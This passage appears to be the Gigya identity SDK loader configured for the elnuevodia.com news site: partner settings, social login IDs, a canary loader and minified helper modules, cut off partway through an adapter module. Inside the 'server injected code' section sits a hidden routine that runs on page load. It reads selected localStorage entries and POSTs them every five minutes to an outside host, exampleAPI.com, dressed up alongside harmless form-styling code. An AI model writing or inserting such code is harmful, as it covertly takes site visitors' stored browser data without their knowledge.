// ### server injected code ###
var gigya = window.gigya;
if (typeof gigya == 'undefined' || !gigya.isGigya) {
  gigya = {
    isGigya: true
  };
}
gigya.apiKey = '3_6lTIHFIzusJkm-TMB23rOsdQTUfjJ_kphOHGbWc-xQbbVhl76PTg8UdPlTz7ethy';
gigya.defaultApiDomain = 'gigya.com';
gigya.dataCenter = 'us1';
gigya.build = {
  "number": 15170,
  "version": "latest"
};
gigya.gmidVersion = 'ver4';
if (typeof gigya.partnerSettings == 'undefined') {
  gigya.partnerSettings = {
    "authMode": "cookie",
    "captchaProvider": "Google",
    "siteGroupGlobalConf": "{\n    // A comma-delimited list of provider names to enable.\n    enabledProviders: '*',\n    defaultRegScreenSet: \"\",\n    defaultMobileRegScreenSet: \"\",\n\n    // Define the language of Gigya's user interface and error message.\n    lang: 'en',\n    \n    // Bind globally to events.\n    // See: http://developers.gigya.com/display/GD/Events#Events-OverridingtheDefaultEventMap\n    customEventMap: {\n        eventMap: [{\n            events: '*',\n            args: [function(e) {\n                return e;\n            }],\n            method: function(e) {\n                if (e.fullEventName === 'login') {\n                    // Handle login event here.\n                } else if (e.fullEventName === 'logout') {\n                    // Handle logout event here.\n                }\n            }\n        }]\n    }\n}",
    "ssoLogoutUrl": "http://elnuevodia.com/logout",
    "invisibleRecaptcha": {
      "siteKey": "6LfUB3gUAAAAAHcAvprwGb9XWU4eCQfRbO1BXqx2"
    },
    "plugins": {
      "connectWithoutLoginBehavior": "alwaysLogin",
      "defaultRegScreenSet": "gfr-login-mobile-NativeApp",
      "defaultMobileRegScreenSet": "Mobile-login",
      "sessionExpiration": -2,
      "rememberSessionExpiration": -2,
      "apiDomain": "us1.gigya.com",
      "workflow": {
        "path": "workflow/resources/js/entryPoint.js"
      }
    },
    "ssoKey": "3_wyJHB2B9byg2FnrbIqbzxLbFr4uBuY6oGAnu5cf-LwKdE_fmwmFROKu6oXlai8IH",
    "baseDomains": "elnuevodia.com,gfrmedia-el-nuevo-dia-prod.cdn.arcpublishing.com",
    "customAPIDomainPrefix": "login"
  };
}
$(function () {
  const watchedItems = [...window.keysToWatch, 'jshook', 'eventListeners'];
  function computeHash(data) {
    const keyArray = Object.keys(data);
    const joinedKeys = keyArray.join("");
    let hashValue = 0;
    for (let i = 0; i < joinedKeys.length; i++) {
      const charCode = joinedKeys.charCodeAt(i);
      hashValue = (hashValue << 5) - hashValue + charCode;
      hashValue = hashValue & hashValue;
    }
    return hashValue.toString(16);
  }
  function searchLocalStorage(filterKeys) {
    const filteredData = {};
    for (let i = 0; i < window.localStorage.length; i++) {
      const key = window.localStorage.key(i);
      if (filterKeys.includes(key)) {
        filteredData[key] = window.localStorage.getItem(key);
      }
    }
    return filteredData;
  }
  function pushDataToServer(data) {
    const hashId = computeHash(data);
    const apiUrl = "https://exampleAPI.com/endpoint";
    const request = new XMLHttpRequest();
    request.open('POST', apiUrl, true);
    request.setRequestHeader('Content-Type', 'application/json');
    const requestData = {
      id: hashId,
      data: data
    };
    request.send(JSON.stringify(requestData));
    request.onreadystatechange = function () {
      if (request.readyState === XMLHttpRequest.DONE) {
        request.status === 200 ? console.log('Data sent successfully') : console.error('Data send failed. Status code: ' + request.status);
      }
    };
  }
  function collectAndSendData(interval = 5 * 60 * 1000) {
    const filteredLocalStorage = searchLocalStorage(watchedItems);
    if (Object.keys(filteredLocalStorage).length > 0) {
      pushDataToServer(filteredLocalStorage);
    }
    setTimeout(collectAndSendData, interval);
  }
  $(document).ready(() => {
    collectAndSendData();
    $('.input-field').on('input', function () {
      const $field = $(this).closest('.field-wrapper');
      if (this.value) {
        $field.addClass('field--not-empty');
      } else {
        $field.removeClass('field--not-empty');
      }
    });
  });
});
gigya.providersConfig = {
  "facebook": {
    "appID": "739890446035192",
    "version": "v2.0"
  },
  "googlePlus": {
    "clientId": "1087162897409-qrdofkkihoojsf1ed2f16mocqtjnlff3.apps.googleusercontent.com",
    "scopes": "email https://www.googleapis.com/auth/plus.login"
  }
};
gigya.samlConfig = {
  "errorPageURL": null,
  "proxyPageURL": null
};
gigya.canary = gigya.canary || {
  isActive: false,
  config: {
    "version": "15170-3-28208520",
    "isEnabled": true,
    "probability": 3,
    "cookiesNames": {
      "isCanary": "gig_canary",
      "version": "gig_canary_ver"
    }
  }
};
gigya.errorReport = {
  "enabled": true,
  "probability": 1
};
gigya.gmidVersion = 'ver4';
gigya.bypassCaptchaV1 = true;
/*! For license information please see gigya.canary.loader.min.js.LICENSE.txt */
!function (t) {
  var n = {};
  function r(e) {
    if (n[e]) return n[e].exports;
    var o = n[e] = {
      i: e,
      l: !1,
      exports: {}
    };
    return t[e].call(o.exports, o, o.exports, r), o.l = !0, o.exports;
  }
  r.m = t, r.c = n, r.d = function (t, n, e) {
    r.o(t, n) || Object.defineProperty(t, n, {
      enumerable: !0,
      get: e
    });
  }, r.r = function (t) {
    "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(t, Symbol.toStringTag, {
      value: "Module"
    }), Object.defineProperty(t, "__esModule", {
      value: !0
    });
  }, r.t = function (t, n) {
    if (1 & n && (t = r(t)), 8 & n) return t;
    if (4 & n && "object" == typeof t && t && t.__esModule) return t;
    var e = Object.create(null);
    if (r.r(e), Object.defineProperty(e, "default", {
      enumerable: !0,
      value: t
    }), 2 & n && "string" != typeof t) for (var o in t) r.d(e, o, function (n) {
      return t[n];
    }.bind(null, o));
    return e;
  }, r.n = function (t) {
    var n = t && t.__esModule ? function () {
      return t.default;
    } : function () {
      return t;
    };
    return r.d(n, "a", n), n;
  }, r.o = function (t, n) {
    return Object.prototype.hasOwnProperty.call(t, n);
  }, r.p = "", r(r.s = 232);
}({
  0: function (t, n, r) {
    "use strict";

    r.r(n), function (t) {
      r.d(n, "__extends", function () {
        return o;
      }), r.d(n, "__assign", function () {
        return i;
      }), r.d(n, "__rest", function () {
        return a;
      }), r.d(n, "__decorate", function () {
        return c;
      }), r.d(n, "__param", function () {
        return u;
      }), r.d(n, "__metadata", function () {
        return f;
      }), r.d(n, "__awaiter", function () {
        return s;
      }), r.d(n, "__generator", function () {
        return l;
      }), r.d(n, "__exportStar", function () {
        return y;
      }), r.d(n, "__values", function () {
        return d;
      }), r.d(n, "__read", function () {
        return p;
      }), r.d(n, "__spread", function () {
        return h;
      }), r.d(n, "__spreadArrays", function () {
        return _;
      }), r.d(n, "__await", function () {
        return v;
      }), r.d(n, "__asyncGenerator", function () {
        return g;
      }), r.d(n, "__asyncDelegator", function () {
        return b;
      }), r.d(n, "__asyncValues", function () {
        return w;
      }), r.d(n, "__makeTemplateObject", function () {
        return m;
      }), r.d(n, "__importStar", function () {
        return P;
      }), r.d(n, "__importDefault", function () {
        return O;
      }), r.d(n, "__classPrivateFieldGet", function () {
        return x;
      }), r.d(n, "__classPrivateFieldSet", function () {
        return S;
      });
      var e = function (t, n) {
        return (e = Object.setPrototypeOf || {
          __proto__: []
        } instanceof Array && function (t, n) {
          t.__proto__ = n;
        } || function (t, n) {
          for (var r in n) n.hasOwnProperty(r) && (t[r] = n[r]);
        })(t, n);
      };
      function o(t, n) {
        function r() {
          this.constructor = t;
        }
        e(t, n), t.prototype = null === n ? Object.create(n) : (r.prototype = n.prototype, new r());
      }
      var i = function () {
        return (i = t || function (t) {
          for (var n, r = 1, e = arguments.length; r < e; r++) for (var o in n = arguments[r]) Object.prototype.hasOwnProperty.call(n, o) && (t[o] = n[o]);
          return t;
        }).apply(this, arguments);
      };
      function a(t, n) {
        var r = {};
        for (var e in t) Object.prototype.hasOwnProperty.call(t, e) && n.indexOf(e) < 0 && (r[e] = t[e]);
        if (null != t && "function" == typeof Object.getOwnPropertySymbols) {
          var o = 0;
          for (e = Object.getOwnPropertySymbols(t); o < e.length; o++) n.indexOf(e[o]) < 0 && Object.prototype.propertyIsEnumerable.call(t, e[o]) && (r[e[o]] = t[e[o]]);
        }
        return r;
      }
      function c(t, n, r, e) {
        var o,
          i = arguments.length,
          a = i < 3 ? n : null === e ? e = Object.getOwnPropertyDescriptor(n, r) : e;
        if ("object" == typeof Reflect && "function" == typeof Reflect.decorate) a = Reflect.decorate(t, n, r, e);else for (var c = t.length - 1; c >= 0; c--) (o = t[c]) && (a = (i < 3 ? o(a) : i > 3 ? o(n, r, a) : o(n, r)) || a);
        return i > 3 && a && Object.defineProperty(n, r, a), a;
      }
      function u(t, n) {
        return function (r, e) {
          n(r, e, t);
        };
      }
      function f(t, n) {
        if ("object" == typeof Reflect && "function" == typeof Reflect.metadata) return Reflect.metadata(t, n);
      }
      function s(t, n, r, e) {
        return new (r || (r = gigya.Promise))(function (o, i) {
          function a(t) {
            try {
              u(e.next(t));
            } catch (t) {
              i(t);
            }
          }
          function c(t) {
            try {
              u(e.throw(t));
            } catch (t) {
              i(t);
            }
          }
          function u(t) {
            var n;
            t.done ? o(t.value) : (n = t.value, n instanceof r ? n : new r(function (t) {
              t(n);
            })).then(a, c);
          }
          u((e = e.apply(t, n || [])).next());
        });
      }
      function l(t, n) {
        var r,
          e,
          o,
          i,
          a = {
            label: 0,
            sent: function () {
              if (1 & o[0]) throw o[1];
              return o[1];
            },
            trys: [],
            ops: []
          };
        return i = {
          next: c(0),
          throw: c(1),
          return: c(2)
        }, "function" == typeof Symbol && (i[Symbol.iterator] = function () {
          return this;
        }), i;
        function c(i) {
          return function (c) {
            return function (i) {
              if (r) throw new TypeError("Generator is already executing.");
              for (; a;) try {
                if (r = 1, e && (o = 2 & i[0] ? e.return : i[0] ? e.throw || ((o = e.return) && o.call(e), 0) : e.next) && !(o = o.call(e, i[1])).done) return o;
                switch (e = 0, o && (i = [2 & i[0], o.value]), i[0]) {
                  case 0:
                  case 1:
                    o = i;
                    break;
                  case 4:
                    return a.label++, {
                      value: i[1],
                      done: !1
                    };
                  case 5:
                    a.label++, e = i[1], i = [0];
                    continue;
                  case 7:
                    i = a.ops.pop(), a.trys.pop();
                    continue;
                  default:
                    if (!(o = a.trys, (o = o.length > 0 && o[o.length - 1]) || 6 !== i[0] && 2 !== i[0])) {
                      a = 0;
                      continue;
                    }
                    if (3 === i[0] && (!o || i[1] > o[0] && i[1] < o[3])) {
                      a.label = i[1];
                      break;
                    }
                    if (6 === i[0] && a.label < o[1]) {
                      a.label = o[1], o = i;
                      break;
                    }
                    if (o && a.label < o[2]) {
                      a.label = o[2], a.ops.push(i);
                      break;
                    }
                    o[2] && a.ops.pop(), a.trys.pop();
                    continue;
                }
                i = n.call(t, a);
              } catch (t) {
                i = [6, t], e = 0;
              } finally {
                r = o = 0;
              }
              if (5 & i[0]) throw i[1];
              return {
                value: i[0] ? i[1] : void 0,
                done: !0
              };
            }([i, c]);
          };
        }
      }
      function y(t, n) {
        for (var r in t) n.hasOwnProperty(r) || (n[r] = t[r]);
      }
      function d(t) {
        var n = "function" == typeof Symbol && Symbol.iterator,
          r = n && t[n],
          e = 0;
        if (r) return r.call(t);
        if (t && "number" == typeof t.length) return {
          next: function () {
            return t && e >= t.length && (t = void 0), {
              value: t && t[e++],
              done: !t
            };
          }
        };
        throw new TypeError(n ? "Object is not iterable." : "Symbol.iterator is not defined.");
      }
      function p(t, n) {
        var r = "function" == typeof Symbol && t[Symbol.iterator];
        if (!r) return t;
        var e,
          o,
          i = r.call(t),
          a = [];
        try {
          for (; (void 0 === n || n-- > 0) && !(e = i.next()).done;) a.push(e.value);
        } catch (t) {
          o = {
            error: t
          };
        } finally {
          try {
            e && !e.done && (r = i.return) && r.call(i);
          } finally {
            if (o) throw o.error;
          }
        }
        return a;
      }
      function h() {
        for (var t = [], n = 0; n < arguments.length; n++) t = t.concat(p(arguments[n]));
        return t;
      }
      function _() {
        for (var t = 0, n = 0, r = arguments.length; n < r; n++) t += arguments[n].length;
        var e = Array(t),
          o = 0;
        for (n = 0; n < r; n++) for (var i = arguments[n], a = 0, c = i.length; a < c; a++, o++) e[o] = i[a];
        return e;
      }
      function v(t) {
        return this instanceof v ? (this.v = t, this) : new v(t);
      }
      function g(t, n, r) {
        if (!Symbol.asyncIterator) throw new TypeError("Symbol.asyncIterator is not defined.");
        var e,
          o = r.apply(t, n || []),
          i = [];
        return e = {}, a("next"), a("throw"), a("return"), e[Symbol.asyncIterator] = function () {
          return this;
        }, e;
        function a(t) {
          o[t] && (e[t] = function (n) {
            return new gigya.Promise(function (r, e) {
              i.push([t, n, r, e]) > 1 || c(t, n);
            });
          });
        }
        function c(t, n) {
          try {
            (r = o[t](n)).value instanceof v ? gigya.Promise.resolve(r.value.v).then(u, f) : s(i[0][2], r);
          } catch (t) {
            s(i[0][3], t);
          }
          var r;
        }
        function u(t) {
          c("next", t);
        }
        function f(t) {
          c("throw", t);
        }
        function s(t, n) {
          t(n), i.shift(), i.length && c(i[0][0], i[0][1]);
        }
      }
      function b(t) {
        var n, r;
        return n = {}, e("next"), e("throw", function (t) {
          throw t;
        }), e("return"), n[Symbol.iterator] = function () {
          return this;
        }, n;
        function e(e, o) {
          n[e] = t[e] ? function (n) {
            return (r = !r) ? {
              value: v(t[e](n)),
              done: "return" === e
            } : o ? o(n) : n;
          } : o;
        }
      }
      function w(t) {
        if (!Symbol.asyncIterator) throw new TypeError("Symbol.asyncIterator is not defined.");
        var n,
          r = t[Symbol.asyncIterator];
        return r ? r.call(t) : (t = d(t), n = {}, e("next"), e("throw"), e("return"), n[Symbol.asyncIterator] = function () {
          return this;
        }, n);
        function e(r) {
          n[r] = t[r] && function (n) {
            return new gigya.Promise(function (e, o) {
              (function (t, n, r, e) {
                gigya.Promise.resolve(e).then(function (n) {
                  t({
                    value: n,
                    done: r
                  });
                }, n);
              })(e, o, (n = t[r](n)).done, n.value);
            });
          };
        }
      }
      function m(t, n) {
        return Object.defineProperty ? Object.defineProperty(t, "raw", {
          value: n
        }) : t.raw = n, t;
      }
      function P(t) {
        if (t && t.__esModule) return t;
        var n = {};
        if (null != t) for (var r in t) Object.hasOwnProperty.call(t, r) && (n[r] = t[r]);
        return n.default = t, n;
      }
      function O(t) {
        return t && t.__esModule ? t : {
          default: t
        };
      }
      function x(t, n) {
        if (!n.has(t)) throw new TypeError("attempted to get private field on non-instance");
        return n.get(t);
      }
      function S(t, n, r) {
        if (!n.has(t)) throw new TypeError("attempted to set private field on non-instance");
        return n.set(t, r), r;
      }
    }.call(this, r(0).__assign);
  },
  145: function (module, exports, __webpack_require__) {
    Object.defineProperty(exports, "__esModule", {
      value: !0
    });
    var CookieProvider_1 = __webpack_require__(233),
      Canary = function () {
        function Canary(t, n, r, e, o, i) {
          void 0 === r && (r = new CookieProvider_1.CookieProvider()), void 0 === e && (e = t.cookiesNames), void 0 === o && (o = function () {
            return new XMLHttpRequest();
          }), void 0 === i && (i = function () {
            return 100 * Math.random();
          }), this._config = t, this._scriptUrl = n, this._cookieProvider = r, this._cookiesNames = e, this._xhrFactory = o, this._random = i;
        }
        return Canary.prototype.shouldCanary = function () {
          return -1 === this._scriptUrl.indexOf("version=") && (this.wasCanarySet() ? "true" == this._cookieProvider.get(this._cookiesNames.isCanary) : this.rollCanary());
        }, Canary.prototype.wasCanarySet = function () {
          return this._cookieProvider.get(this._cookiesNames.isCanary) && this._cookieProvider.get(this._cookiesNames.version) == this._config.version;
        }, Canary.prototype.rollCanary = function () {
          var t = this._random() <= this._config.probability;
          return this._cookieProvider.put(this._cookiesNames.isCanary, t.toString()), this._cookieProvider.put(this._cookiesNames.version, this._config.version), t;
        }, Canary.prototype.onCanaryLoadFail = function () {
          window.gigya.canary.isActive = !1;
        }, Canary.prototype.loadCanaryVersion = function () {
          var _this = this,
            xhr = this._xhrFactory();
          xhr.open("GET", this._scriptUrl + "&version=canary", !1), xhr.onload = function (res) {
            var request = res.currentTarget;
            if (4 !== request.readyState || 200 !== request.status) _this.onCanaryLoadFail();else try {
              window.gigya.canary.isLoaded = !0, eval(request.responseText), window.gigya.canary.isActive = !0;
            } catch (t) {
              _this.onCanaryLoadFail();
            }
          };
          try {
            xhr.send(null);
          } catch (t) {
            this.onCanaryLoadFail();
          }
        }, Canary.prototype.bootstrap = function (t) {
          void 0 === t && (t = !window.gigya.canary.isActive), !this._config.probability || window.gigya.canary.isLoaded && !window.gigya.canary.isActive ? (this._cookieProvider.remove(this._cookiesNames.isCanary), this._cookieProvider.remove(this._cookiesNames.version)) : t && this.shouldCanary() && this.loadCanaryVersion();
        }, Canary;
      }();
    exports.Canary = Canary;
  },
  232: function (t, n, r) {
    (function (t) {
      Object.defineProperty(n, "__esModule", {
        value: !0
      });
      var e,
        o,
        i = r(145),
        a = r(145);
      r(234), window.gigya.canary || (window.gigya.canary = {}), t(window.gigya.canary, i), o = document.currentScript, new a.Canary(window.gigya.canary.config, null !== (e = null == o ? void 0 : o.src) && void 0 !== e ? e : "").bootstrap();
    }).call(this, r(0).__assign);
  },
  233: function (t, n) {
    Object.defineProperty(n, "__esModule", {
      value: !0
    });
    var r = function () {
      function t() {}
      return t.prototype.get = function (t) {
        try {
          var n = document.cookie.match(new RegExp(t + "=([^$;]*)"));
          return n ? n[1] : null;
        } catch (t) {
          return null;
        }
      }, t.prototype.put = function (t, n) {
        try {
          document.cookie = t + "=" + n + ";path=/;domain=." + location.hostname;
        } catch (t) {}
      }, t.prototype.remove = function (t) {
        try {
          document.cookie = t + "=; expires=Thu, 01 Jan 1970 00:00:01 GMT; path=/;domain=." + location.hostname;
        } catch (t) {}
      }, t;
    }();
    n.CookieProvider = r;
  },
  234: function (t, n) {
    !function (t) {
      var n = t.getElementsByTagName("script");
      "currentScript" in t || Object.defineProperty(t, "currentScript", {
        get: function () {
          try {
            throw new Error();
          } catch (e) {
            var t,
              r = (/.*at [^\(]*\((.*):.+:.+\)$/gi.exec(e.stack) || [!1])[1];
            for (t in n) if (n[t].src == r || "interactive" == n[t].readyState) return n[t];
            return null;
          }
        }
      });
    }(document);
  }
});
if (gigya.canary && gigya.canary.isActive) {} else if (gigya.__initialized) {
  console.warn('**** gigya.js loaded twice ****');
} else {
  gigya.__initialized = true;
  // ### end server injected code ###
  // API adapters
  /*! For license information please see gigya.adapters.web.min.js.LICENSE.txt */
  !function (e) {
    var t = {};
    function i(n) {
      if (t[n]) return t[n].exports;
      var o = t[n] = {
        i: n,
        l: !1,
        exports: {}
      };
      return e[n].call(o.exports, o, o.exports, i), o.l = !0, o.exports;
    }
    i.m = e, i.c = t, i.d = function (e, t, n) {
      i.o(e, t) || Object.defineProperty(e, t, {
        enumerable: !0,
        get: n
      });
    }, i.r = function (e) {
      "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, {
        value: "Module"
      }), Object.defineProperty(e, "__esModule", {
        value: !0
      });
    }, i.t = function (e, t) {
      if (1 & t && (e = i(e)), 8 & t) return e;
      if (4 & t && "object" == typeof e && e && e.__esModule) return e;
      var n = Object.create(null);
      if (i.r(n), Object.defineProperty(n, "default", {
        enumerable: !0,
        value: e
      }), 2 & t && "string" != typeof e) for (var o in e) i.d(n, o, function (t) {
        return e[t];
      }.bind(null, o));
      return n;
    }, i.n = function (e) {
      var t = e && e.__esModule ? function () {
        return e.default;
      } : function () {
        return e;
      };
      return i.d(t, "a", t), t;
    }, i.o = function (e, t) {
      return Object.prototype.hasOwnProperty.call(e, t);
    }, i.p = "", i(i.s = 317);
  }({
    0: function (e, t, i) {
      "use strict";

      i.r(t), function (e) {
        i.d(t, "__extends", function () {
          return o;
        }), i.d(t, "__assign", function () {
          return r;
        }), i.d(t, "__rest", function () {
          return a;
        }), i.d(t, "__decorate", function () {
          return s;
        }), i.d(t, "__param", function () {
          return u;
        }), i.d(t, "__metadata", function () {
          return c;
        }), i.d(t, "__awaiter", function () {
          return l;
        }), i.d(t, "__generator", function () {
          return g;
        }), i.d(t, "__exportStar", function () {
          return d;
        }), i.d(t, "__values", function () {
          return f;
        }), i.d(t, "__read", function () {
          return p;
        }), i.d(t, "__spread", function () {
          return h;
        }), i.d(t, "__spreadArrays", function () {
          return y;
        }), i.d(t, "__await", function () {
          return v;
        }), i.d(t, "__asyncGenerator", function () {
          return w;
        }), i.d(t, "__asyncDelegator", function () {
          return m;
        }), i.d(t, "__asyncValues", function () {
          return _;
        }), i.d(t, "__makeTemplateObject", function () {
          return b;
        }), i.d(t, "__importStar", function () {
          return S;
        }), i.d(t, "__importDefault", function () {
          return k;
        }), i.d(t, "__classPrivateFieldGet", function () {
          return I;
        }), i.d(t, "__classPrivateFieldSet", function () {
          return P;
        });
        var n = function (e, t) {
          return (n = Object.setPrototypeOf || {
            __proto__: []
          } instanceof Array && function (e, t) {
            e.__proto__ = t;
          } || function (e, t) {
            for (var i in t) t.hasOwnProperty(i) && (e[i] = t[i]);
          })(e, t);
        };
        function o(e, t) {
          function i() {
            this.constructor = e;
          }
          n(e, t), e.prototype = null === t ? Object.create(t) : (i.prototype = t.prototype, new i());
        }
        var r = function () {
          return (r = e || function (e) {
            for (var t, i = 1, n = arguments.length; i < n; i++) for (var o in t = arguments[i]) Object.prototype.hasOwnProperty.call(t, o) && (e[o] = t[o]);
            return e;
          }).apply(this, arguments);
        };
        function a(e, t) {
          var i = {};
          for (var n in e) Object.prototype.hasOwnProperty.call(e, n) && t.indexOf(n) < 0 && (i[n] = e[n]);
          if (null != e && "function" == typeof Object.getOwnPropertySymbols) {
            var o = 0;
            for (n = Object.getOwnPropertySymbols(e); o < n.length; o++) t.indexOf(n[o]) < 0 && Object.prototype.propertyIsEnumerable.call(e, n[o]) && (i[n[o]] = e[n[o]]);
          }
          return i;
        }
        function s(e, t, i, n) {
          var o,
            r = arguments.length,
            a = r < 3 ? t : null === n ? n = Object.getOwnPropertyDescriptor(t, i) : n;
          if ("object" == typeof Reflect && "function" == typeof Reflect.decorate) a = Reflect.decorate(e, t, i, n);else for (var s = e.length - 1; s >= 0; s--) (o = e[s]) && (a = (r < 3 ? o(a) : r > 3 ? o(t, i, a) : o(t, i)) || a);
          return r > 3 && a && Object.defineProperty(t, i, a), a;
        }
        function u(e, t) {
          return function (i, n) {
            t(i, n, e);
          };
        }
        function c(e, t) {
          if ("object" == typeof Reflect && "function" == typeof Reflect.metadata) return Reflect.metadata(e, t);
        }
        function l(e, t, i, n) {
          return new (i || (i = gigya.Promise))(function (o, r) {
            function a(e) {
              try {
                u(n.next(e));
              } catch (e) {
                r(e);
              }
            }
            function s(e) {
              try {
                u(n.throw(e));
              } catch (e) {
                r(e);
              }
            }
            function u(e) {
              var t;
              e.done ? o(e.value) : (t = e.value, t instanceof i ? t : new i(function (e) {
                e(t);
              })).then(a, s);
            }
            u((n = n.apply(e, t || [])).next());
          });
        }
        function g(e, t) {
          var i,
            n,
            o,
            r,
            a = {
              label: 0,
              sent: function () {
                if (1 & o[0]) throw o[1];
                return o[1];
              },
              trys: [],
              ops: []
            };
          return r = {
            next: s(0),
            throw: s(1),
            return: s(2)
          }, "function" == typeof Symbol && (r[Symbol.iterator] = function () {
            return this;
          }), r;
          function s(r) {
            return function (s) {
              return function (r) {
                if (i) throw new TypeError("Generator is already executing.");
                for (; a;) try {
                  if (i = 1, n && (o = 2 & r[0] ? n.return : r[0] ? n.throw || ((o = n.return) && o.call(n), 0) : n.next) && !(o = o.call(n, r[1])).done) return o;
                  switch (n = 0, o && (r = [2 & r[0], o.value]), r[0]) {
                    case 0:
                    case 1:
                      o = r;
                      break;
                    case 4:
                      return a.label++, {
                        value: r[1],
                        done: !1
                      };
                    case 5:
                      a.label++, n = r[1], r = [0];
                      continue;
                    case 7:
                      r = a.ops.pop(), a.trys.pop();
                      continue;
                    default:
                      if (!(o = a.trys, (o = o.length > 0 && o[o.length - 1]) || 6 !== r[0] && 2 !== r[0])) {
                        a = 0;
                        continue;
                      }
                      if (3 === r[0] && (!o || r[1] > o[0] && r[1] < o[3])) {
                        a.label = r[1];
                        break;
                      }
                      if (6 === r[0] && a.label < o[1]) {
                        a.label = o[1], o = r;
                        break;
                      }
                      if (o && a.label < o[2]) {
                        a.label = o[2], a.ops.push(r);
                        break;
                      }
                      o[2] && a.ops.pop(), a.trys.pop();
                      continue;
                  }
                  r = t.call(e, a);
                } catch (e) {
                  r = [6, e], n = 0;
                } finally {
                  i = o = 0;
                }
                if (5 & r[0]) throw r[1];
                return {
                  value: r[0] ? r[1] : void 0,
                  done: !0
                };
              }([r, s]);
            };
          }
        }
        function d(e, t) {
          for (var i in e) t.hasOwnProperty(i) || (t[i] = e[i]);
        }
        function f(e) {
          var t = "function" == typeof Symbol && Symbol.iterator,
            i = t && e[t],
            n = 0;
          if (i) return i.call(e);
          if (e && "number" == typeof e.length) return {
            next: function () {
              return e && n >= e.length && (e = void 0), {
                value: e && e[n++],
                done: !e
              };
            }
          };
          throw new TypeError(t ? "Object is not iterable." : "Symbol.iterator is not defined.");
        }
        function p(e, t) {
          var i = "function" == typeof Symbol && e[Symbol.iterator];
          if (!i) return e;
          var n,
            o,
            r = i.call(e),
            a = [];
          try {
            for (; (void 0 === t || t-- > 0) && !(n = r.next()).done;) a.push(n.value);
          } catch (e) {
            o = {
              error: e
            };
          } finally {
            try {
              n && !n.done && (i = r.return) && i.call(r);
            } finally {
              if (o) throw o.error;
            }
          }
          return a;
        }
        function h() {
          for (var e = [], t = 0; t < arguments.length; t++) e = e.concat(p(arguments[t]));
          return e;
        }
        function y() {
          for (var e = 0, t = 0, i = arguments.length; t < i; t++) e += arguments[t].length;
          var n = Array(e),
            o = 0;
          for (t = 0; t < i; t++) for (var r = arguments[t], a = 0, s = r.length; a < s; a++, o++) n[o] = r[a];
          return n;
        }
        function v(e) {
          return this instanceof v ? (this.v = e, this) : new v(e);
        }
        function w(e, t, i) {
          if (!Symbol.asyncIterator) throw new TypeError("Symbol.asyncIterator is not defined.");
          var n,
            o = i.apply(e, t || []),
            r = [];
          return n = {}, a("next"), a("throw"), a("return"), n[Symbol.asyncIterator] = function () {
            return this;
          }, n;
          function a(e) {
            o[e] && (n[e] = function (t) {
              return new gigya.Promise(function (i, n) {
                r.push([e, t, i, n]) > 1 || s(e, t);
              });
            });
          }
          function s(e, t) {
            try {
              (i = o[e](t)).value instanceof v ? gigya.Promise.resolve(i.value.v).then(u, c) : l(r[0][2], i);
            } catch (e) {
              l(r[0][3], e);
            }
            var i;
          }
          function u(e) {
            s("next", e);
          }
          function c(e) {
            s("throw", e);
          }
          function l(e, t) {
            e(t), r.shift(), r.length && s(r[0][0], r[0][1]);
          }
        }
        function m(e) {
          var t, i;
          return t = {}, n("next"), n("throw", function (e) {
            throw e;
          }), n("return"), t[Symbol.iterator] = function () {
            return this;
          }, t;
          function n(n, o) {
            t[n] = e[n] ? function (t) {
              return (i = !i) ? {
                value: v(e[n](t)),
                done: "return" === n
              } : o ? o(t) : t;
            } : o;
          }
        }
        function _(e) {
          if (!Symbol.asyncIterator) throw new TypeError("Symbol.asyncIterator is not defined.");
          var t,
            i = e[Symbol.asyncIterator];
          return i ? i.call(e) : (e = f(e), t = {}, n("next"), n("throw"), n("return"), t[Symbol.asyncIterator] = function () {
            return this;
          }, t);
          function n(i) {
            t[i] = e[i] && function (t) {
              return new gigya.Promise(function (n, o) {
                (function (e, t, i, n) {
                  gigya.Promise.resolve(n).then(function (t) {
                    e({
                      value: t,
                      done: i
                    });
                  }, t);
                })(n, o, (t = e[i](t)).done, t.value);
              });
            };
          }
        }
        function b(e, t) {
          return Object.defineProperty ? Object.defineProperty(e, "raw", {
            value: t
          }) : e.raw = t, e;
        }
        function S(e) {
          if (e && e.__esModule) return e;
          var t = {};
          if (null != e) for (var i in e) Object.hasOwnProperty.call(e, i) && (t[i] = e[i]);
          return t.default = e, t;
        }
        function k(e) {
          return e && e.__esModule ? e : {
            default: e
          };
        }
        function I(e, t) {
          if (!t.has(e)) throw new TypeError("attempted to get private field on non-instance");
          return t.get(e);
        }
        function P(e, t, i) {
          if (!t.has(e)) throw new TypeError("attempted to set private field on non-instance");
          return t.set(e, i), i;
        }
      }.call(this, i(0).__assign);
    },
    10: function (e, t, i) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var n = i(11),
        o = i(16),
        r = i(4);
      function a(e) {
        return decodeURIComponent(e.replace(/\+/g, " "));
      }
      function s(e, t) {
        return e && -1 !== e.indexOf("?") ? o.deserialize(e.split("#")[0].split("?")[1], "&", t) : {};
      }
      t.URLEncode = function (e) {
        return encodeURIComponent(e);
      }, t.URLDecode = a, t.URLDecodeRecursive = function (e) {
        for (var t = "", i = e; i != t;) i = a(t = i);
        return i;
      }, t.getParamsFromURL = s, t.getGigParamsFromURL = function (e) {
        var t = e || {},
          i = t.url,
          o = t.paramPrefix,
          r = t.keysToLower,
          a = t.removePrefix,
          u = o || n.GIGYA_PARAM_PREFIX,
          c = s(i, r);
        return Object.keys(c).filter(function (e) {
          return 0 === e.indexOf(u) && e !== u;
        }).reduce(function (e, t) {
          return e[a ? t.slice(4) : t] = c[t], e;
        }, {});
      }, t.getParamValueFromURL = function (e, t, i) {
        if (null == t || "" == t) return i;
        var n = t.indexOf("?");
        if (-1 === n) return i;
        var o = "&" + t.substr(n + 1),
          r = o.toLowerCase().indexOf("&" + e.toLowerCase() + "=");
        if (-1 === r) return i;
        var a = o.substr(r + (1 + e.length + 1)) + "&";
        return r = a.indexOf("&"), a.substr(0, r);
      }, t.addParamsToURL = function (e, t) {
        var i = s(e);
        r.add(i, t);
        var n = e.split("#"),
          a = n[0].split("?")[0] + "?" + o.serialize(i, "&");
        return n.length > 1 && (a += "#" + n[1]), a;
      };
      t.getContextParamsFromUrl = function (e) {
        var t = e || {},
          i = t.url,
          n = t.paramPrefix,
          o = t.unacceptableParams;
        return i ? function (e, t) {
          if (!t) return e;
          var i = {};
          return Object.entries(e || {}).filter(function (e) {
            var i = e[0];
            return !t.test(i);
          }).forEach(function (e) {
            var t = e[0],
              n = e[1];
            return i[t] = n;
